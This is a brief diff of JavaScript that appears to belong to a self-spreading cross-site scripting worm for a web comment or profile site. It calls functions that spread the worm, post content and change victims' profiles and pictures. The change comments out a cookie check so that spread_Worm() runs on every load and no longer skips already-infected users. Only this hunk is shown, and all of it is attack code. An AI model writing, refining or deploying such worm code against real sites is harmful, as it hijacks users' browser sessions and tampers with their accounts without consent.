@@ -90,9 +90,9 @@ function spread_Worm(){
 // GET /add_comment.php?id=127&comment=oof
 
 const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
-if (cookies.get("rekt") != "yes") {
+//if (cookies.get("rekt") != "yes") {
     spread_Worm()
-}
+//}
 post_About();
 change_Profile();
 setTimeout(change_Picture,1000)
